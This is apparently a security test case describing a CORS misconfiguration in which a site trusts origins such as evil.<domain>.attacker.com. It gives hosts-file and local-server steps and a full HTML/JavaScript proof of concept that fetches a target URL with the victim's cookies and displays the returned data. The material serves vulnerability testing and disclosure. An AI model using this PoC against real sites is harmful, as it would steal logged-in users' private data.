Test Case 1 :
Bug Name   : CORS misconfiguration allows attacker-controlled origins that contain legitimate host
Description: The website only works with its main domain (like victim.com). If someone tries to use a different domain, it shows an error. But if a subdomain (like evil.victim.com) 
             works, that is a CORS security problem.
Note : 
 -> The website should only allow the main domain, not other domains or subdomains.
 -> If the site allows login info (credentials), it must be very careful and only accept the main domain.

Steps To Reproduce :
1. Edit your hosts file : Add a fake subdomain pointing to 127.0.0.1 127.0.0.1 evil.<domain url of the orgin of the website>.attacker.com
   Windows: C:\Windows\System32\drivers\etc\hosts
   Linux/macOS: /etc/hosts
2. Start a local HTTP server: In the folder where your HTML PoC is saved:\
   python3 -m http.server 8000
   Now your PoC is served at: http://evil.<domain url in the orgin of the website>.attacker.com:8000/cors-poc.html

CORS POC : 
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>CORS Exploit PoC</title>
</head>
<body>
<h2>CORS Exploit PoC — Fetch Sensitive Data</h2>
<button id="fetchBtn">Fetch Sensitive Data</button>
<pre id="output"></pre>

<script>
document.getElementById("fetchBtn").onclick = async () => {
  try {
    const res = await fetch(
      "<URL want to Change >",
      {
        method: "GET",
        credentials: "include"  // cookies sent along
      }
    );
    const data = await res.json();
    document.getElementById("output").innerText = JSON.stringify(data, null, 2);
  } catch (err) {
    document.getElementById("output").innerText = "Fetch failed: " + err;
  }
};
</script>
</body>
</html>


Step 4 — Run the PoC
Open your browser and navigate to:
http://evil.<Orgin URL>.attacker.com:8000/cors-poc.html
Make sure you are logged into the real target site in the same browser.
Click Fetch Sensitive Data → the JSON should appear in the <pre> tag.
___________________________________________________________________________________________________________________________



